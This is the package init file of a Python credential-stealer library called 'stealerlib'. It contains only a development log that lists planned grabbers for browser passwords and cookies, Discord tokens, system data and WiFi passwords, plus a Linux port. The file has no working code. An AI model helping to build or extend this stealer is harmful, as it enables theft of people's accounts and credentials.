#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/__init__.py
"""

UPDATE_LOG = """
Currently Working / Late stages of alpha development:
    - Browser()
        - * somehow fix the decryption for chromium based browser passwords (currently returning None for all...)
        - create a working cookie grabber for the supported chromium based browsers (Google Chrome, Opera)
        - finish the password grabbers for the non-chromium based browsers (Brave, FireFox)
            - after this, make a working cookie grabber for them
        - when the previously mentioned functions are operational, move on to creating history and downloads grabbers for all of the browsers
    - Discord()
        - maybe update regex on get_tokens()
        - need to implement fetching account information using the Discord tokens
        - make the Discord section use the Account dataclass when storing user information
    - System()
        - Create basic system grabbing functionality
    - WiFi()
        - make get_wifi_passwords() use seperate functions for scraping profiles and getting their information
        - implement a local machine scraper

When all of the basic functionality is done:
    Rewrite all sub-packages with Linux functionality (stealerlib/linux)
        - Browser()
        - Discord()
        - System()
        - WiFi()
"""

